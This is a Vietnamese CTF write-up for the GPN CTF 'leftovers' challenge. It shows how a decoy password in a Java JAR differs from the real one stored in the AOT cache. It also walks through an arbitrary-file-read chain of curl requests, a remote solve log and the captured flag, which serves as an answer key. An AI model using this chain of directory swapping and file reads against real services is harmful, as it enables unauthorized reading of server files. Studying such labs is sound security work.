# GPN CTF 2024/2026(?) — `leftovers` Write-up

## Thông tin cơ bản
- **Challenge**: `leftovers`
- **Category**: Reverse Engineering / Web
- **Mức độ**: Medium
- **Mục tiêu**: Đọc được flag thật từ remote service.

## Kết quả cuối cùng
**Flag thật**:

```text
GPNCTF{l3ft_0r_rIGH7_COde_c4chE_vAlId4tI0N_sAY5_G0oD_NiGht}
```

## Tóm tắt ý tưởng
Challenge nhìn bề ngoài giống một web service Java rất đơn giản: có endpoint thêm sản phẩm, endpoint đọc ảnh của sản phẩm, và endpoint đổi thư mục chứa ảnh nếu cung cấp đúng password.

Điểm đánh lừa nằm ở chỗ:
- Nếu chỉ decompile `leftovers.jar`, ta thấy password là `supersecret`.
- Nhưng service thực tế **không chỉ chạy JAR**. Nó chạy bằng:

```bash
./my-jdk/bin/java -XX:AOTCache=cache.aot -jar leftovers.jar
```

Điều đó có nghĩa là logic thực thi có thể đến từ **AOT cache** chứ không còn hoàn toàn khớp với bytecode trong JAR.

Sau khi reverse phần mã thực sự được lấy từ AOT cache, password hợp lệ được khôi phục là:

```text
algomaster99
```

Từ đó, ta khai thác endpoint `/set-image-dir` để đổi thư mục ảnh sang `/`, tạo một product tên `flag`, rồi gọi `/images/flag`. Vì code resolve đường dẫn theo dạng:

```java
folderPath.resolve(sanitize(product.name))
```

nên khi `folderPath = /` và `product.name = flag`, request `/images/flag` sẽ đọc file:

```text
/flag
```

Đó chính là file chứa flag trên remote.

---

## Phân tích ban đầu
Trong `Dockerfile`, service chạy như sau:

```dockerfile
ENTRYPOINT /my-jdk/bin/java -XX:AOTCache=cache.aot -jar leftovers.jar
```

Đây là tín hiệu quan trọng nhất của bài. Nếu challenge chỉ là reverse JAR thông thường thì không cần `cache.aot`. Việc có thêm AOT cache cho thấy phải nghi ngờ rằng:

1. Có thể tồn tại **code cũ / code khác** trong cache.
2. Logic trong runtime có thể **không khớp** với logic decompile từ JAR.
3. Nếu chỉ tin vào JAR, rất dễ đi sai hướng.

### Những endpoint đáng chú ý
Từ `Server.class`, ta thấy các route chính:
- `PUT /products/{name}`: thêm sản phẩm.
- `GET /images/{name}`: lấy ảnh tương ứng với product name.
- `POST /set-image-dir`: đổi thư mục ảnh nếu password đúng.

Decompile phần JAR cho thấy password check trông như sau:

```java
"supersecret".toCharArray();
Arrays.equals(expected, provided.toCharArray())
```

Nhưng đây chỉ là **mồi nhử**.

---

## Vì sao `supersecret` là bẫy?
Khi chạy service **không dùng AOT cache**, password `supersecret` hoạt động như mong đợi. Nhưng khi chạy đúng challenge với `-XX:AOTCache=cache.aot`, password đó lại bị từ chối.

Điều này chứng minh rằng:
- bytecode trong JAR **không phải** logic cuối cùng đang được thực thi;
- phần kiểm tra password đã bị thay đổi trong AOT cache.

Nói ngắn gọn: đây là bài về **code/cache mismatch**.

---

## Điểm yếu khai thác
Sau khi reverse phần code thực thi thật từ AOT cache, password hợp lệ được khôi phục là:

```text
algomaster99
```

Khi đã có password này, endpoint `/set-image-dir` cho phép đổi `image directory` đến **bất kỳ thư mục nào tồn tại và là directory**:

```java
Files.exists(newPath) && Files.isDirectory(newPath)
```

Không có ràng buộc whitelist, không giới hạn trong một root an toàn, cũng không có sandbox path. Đây là primitive rất mạnh.

### Logic đọc file
`ImageStore` resolve file theo dạng:

```java
private Path resolveImagePath(Product p) {
    return folderPath.resolve(sanitizeName(p.name()));
}
```

với hàm sanitize:

```java
name.replaceAll("[^a-zA-Z0-9_-]", "_")
```

Nếu tạo product tên `flag`, chuỗi này không bị thay đổi. Khi đó:
- `folderPath = /`
- `product.name = flag`
- đường dẫn đọc ra sẽ là `/flag`

Nếu `/flag` tồn tại và readable, endpoint `/images/flag` sẽ trả lại nội dung file.

---

## Chuỗi khai thác hoàn chỉnh
### Bước 1: Tạo product tên `flag`
Ta cần product tồn tại trước, vì `/images/{name}` chỉ làm việc với product đã có trong state.

Request:

```http
PUT /products/flag
Content-Type: application/json

{"name":"flag","quantity":1,"bestBefore":"2030-01-01T00:00:00","notAfter":"2030-01-02T00:00:00"}
```

### Bước 2: Đổi image directory bằng password thật
Dùng password khôi phục từ AOT cache:

```text
algomaster99
```

Trước tiên script thử `/tmp`, nhưng không có file flag ở đó.

### Bước 3: Đổi sang thư mục `/`
Khi `newPath` được set thành `/`, đường dẫn ảnh của product `flag` trở thành `/flag`.

### Bước 4: Đọc `/images/flag`
Server trả về nội dung file `/flag`, chính là flag thật.

---

## Log remote thật
Dưới đây là **log thực tế** từ quá trình solve remote:

```text
┌──(light㉿Huei)-[~/…/CTF/GPN_CTF/reverse/leftovers]
└─$ python3 solve_leftovers.py \
  https://wok-tossed-berry-infused-with-compressed-hollandaise-xhlz.gpn24.ctf.kitctf.de
[+] target: https://wok-tossed-berry-infused-with-compressed-hollandaise-xhlz.gpn24.ctf.kitctf.de/
[+] recovered AOT password: algomaster99
[+] creating product named 'flag' so /images/flag resolves to <imageDir>/flag

>>> PUT https://wok-tossed-berry-infused-with-compressed-hollandaise-xhlz.gpn24.ctf.kitctf.de/products/flag
>>> body: {"name":"flag","quantity":1,"bestBefore":"2030-01-01T00:00:00","notAfter":"2030-01-02T00:00:00"}
<<< HTTP 200 OK
<<< Content-Type: text/plain
Added product :)

===== trying image directory: /tmp =====

>>> POST https://wok-tossed-berry-infused-with-compressed-hollandaise-xhlz.gpn24.ctf.kitctf.de/set-image-dir
>>> body: {"password":"algomaster99","newPath":"/tmp"}
<<< HTTP 200 OK
<<< Content-Type: text/plain

>>> GET https://wok-tossed-berry-infused-with-compressed-hollandaise-xhlz.gpn24.ctf.kitctf.de/images/flag
<<< HTTP 404 Not Found
<<< Content-Type: text/plain
Image not found

===== trying image directory: / =====

>>> POST https://wok-tossed-berry-infused-with-compressed-hollandaise-xhlz.gpn24.ctf.kitctf.de/set-image-dir
>>> body: {"password":"algomaster99","newPath":"/"}
<<< HTTP 200 OK
<<< Content-Type: text/plain

>>> GET https://wok-tossed-berry-infused-with-compressed-hollandaise-xhlz.gpn24.ctf.kitctf.de/images/flag
<<< HTTP 200 OK
<<< Content-Type: text/plain
GPNCTF{l3ft_0r_rIGH7_COde_c4chE_vAlId4tI0N_sAY5_G0oD_NiGht}


[+] FLAG FOUND via directory /: GPNCTF{l3ft_0r_rIGH7_COde_c4chE_vAlId4tI0N_sAY5_G0oD_NiGht}
[+] proof: server returned HTTP 200 for GET /images/flag after setting image dir and body matches GPNCTF{...}

FINAL_FLAG=GPNCTF{l3ft_0r_rIGH7_COde_c4chE_vAlId4tI0N_sAY5_G0oD_NiGht}
```

---

## Vì sao đây là flag thật?
Đây không phải kết quả đoán format hay brute force. Có ba bằng chứng trực tiếp:

1. **Có chuỗi khai thác hợp lệ end-to-end**: từ reverse → lấy password thật → đổi path → đọc file.
2. **Server remote trả HTTP 200** cho request `GET /images/flag` sau khi path được set thành `/`.
3. **Response body chứa đúng một chuỗi theo format `GPNCTF{...}`**, và script chỉ chấp nhận khi nhận được dữ liệu khớp regex flag thực tế.

Nói cách khác, flag này được lấy bằng **file read thực tế từ server**, không phải suy luận từ source hay cache dump local.

---

## Phân tích nguyên nhân gốc rễ
Lỗ hổng của challenge là sự kết hợp của **hai vấn đề**:

### 1. Inconsistent runtime giữa JAR và AOT cache
JAR hiển thị một logic kiểm tra password, nhưng runtime thực tế lại dùng logic khác từ `cache.aot`. Điều này tạo nên tình huống “left hand / right hand mismatch”: người phân tích tin vào JAR sẽ luôn đi sai.

### 2. Arbitrary directory selection
Sau khi qua được password check, server cho phép set `image directory` đến **mọi thư mục tồn tại**. Đây là một thiết kế không an toàn vì nó biến cơ chế lấy ảnh thành primitive đọc file cục bộ.

Khi ghép với việc tên product có thể chọn là `flag`, ta biến endpoint `/images/flag` thành một file read trực tiếp tới `/flag`.

---

## Reproduction nhanh
Chạy solver:

```bash
python3 solve_leftovers.py \
  https://wok-tossed-berry-infused-with-compressed-hollandaise-xhlz.gpn24.ctf.kitctf.de
```

Hoặc thủ công bằng curl:

```bash
BASE='https://wok-tossed-berry-infused-with-compressed-hollandaise-xhlz.gpn24.ctf.kitctf.de'

curl -i -X PUT "$BASE/products/flag" \
  -H 'Content-Type: application/json' \
  --data '{"name":"flag","quantity":1,"bestBefore":"2030-01-01T00:00:00","notAfter":"2030-01-02T00:00:00"}'

curl -i -X POST "$BASE/set-image-dir" \
  -H 'Content-Type: application/json' \
  --data '{"password":"algomaster99","newPath":"/"}'

curl -i "$BASE/images/flag"
```

---

## Kết luận
Đây là một challenge rất hay vì nó lợi dụng đúng thói quen phổ biến khi reverse Java: decompile JAR rồi tin rằng đó là toàn bộ sự thật. Nhưng ở bài này, runtime lại bị “lệch” bởi `AOTCache`, khiến password trong source chỉ là bẫy.

Khai thác cuối cùng khá gọn:
- reverse AOT cache để lấy password thật `algomaster99`;
- tạo product `flag`;
- set image dir thành `/`;
- đọc `/images/flag` để nhận nội dung `/flag`.

**Final flag**:

```text
GPNCTF{l3ft_0r_rIGH7_COde_c4chE_vAlId4tI0N_sAY5_G0oD_NiGht}
```

---

## Phụ lục: file solve
Script exploit đã dùng:
- `solve_leftovers.py`

Logic chính của script:
1. gửi `PUT /products/flag`;
2. thử `POST /set-image-dir` với password `algomaster99` trên một số thư mục ứng viên;
3. gọi `GET /images/flag`;
4. chỉ chấp nhận khi body khớp regex `GPNCTF{...}`.
